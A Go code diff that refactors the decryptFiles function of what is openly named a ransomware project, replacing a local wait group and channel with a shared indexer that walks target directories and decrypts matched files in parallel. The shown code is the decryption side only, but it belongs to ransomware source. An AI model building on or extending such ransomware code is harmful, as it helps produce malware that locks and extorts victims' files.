@@ -7,7 +7,6 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
-	"sync"
 
 	"github.com/mauri870/ransomware/cmd"
 	"github.com/mauri870/ransomware/cryptofs"
@@ -59,15 +58,13 @@ func decryptFiles(key string) {
 
 	log.Println("Walking dirs and searching for encrypted files...")
 
-	// Setup a waitgroup so we can wait for all goroutines to finish
-	var wg sync.WaitGroup
-
-	wg.Add(1)
+	// Add a goroutine to the WaitGroup
+	cmd.Indexer.Add(1)
 
 	// Indexing files in a concurrently thread
 	go func() {
 		// Decrease the wg count after finish this goroutine
-		defer wg.Done()
+		defer cmd.Indexer.Done()
 
 		// Loop over the interesting directories
 		for _, f := range cmd.InterestingDirs {
@@ -81,17 +78,17 @@ func decryptFiles(key string) {
 					// Send the file to the MatchedFiles channel then workers
 					// can imediatelly proccess then
 					log.Println("Matched:", path)
-					cmd.MatchedFiles <- &cryptofs.File{FileInfo: f, Extension: ext[1:], Path: path}
+					cmd.Indexer.Files <- &cryptofs.File{FileInfo: f, Extension: ext[1:], Path: path}
 
 					// For each file we need wait for the respective goroutine to finish
-					wg.Add(1)
+					cmd.Indexer.Add(1)
 				}
 				return nil
 			})
 		}
 
 		// Close the MatchedFiles channel after all files have been indexed and send to then
-		close(cmd.MatchedFiles)
+		close(cmd.Indexer.Files)
 	}()
 
 	// Process files that are sended to the channel
@@ -100,12 +97,12 @@ func decryptFiles(key string) {
 		go func() {
 			for {
 				select {
-				case file, ok := <-cmd.MatchedFiles:
+				case file, ok := <-cmd.Indexer.Files:
 					// Check if has nothing to receive from the channel
 					if !ok {
 						return
 					}
-					defer wg.Done()
+					defer cmd.Indexer.Done()
 
 					log.Printf("Decrypting %s...\n", file.Path)
 
@@ -145,5 +142,5 @@ func decryptFiles(key string) {
 	}
 
 	// Wait for all goroutines to finish
-	wg.Wait()
+	cmd.Indexer.Wait()
 }
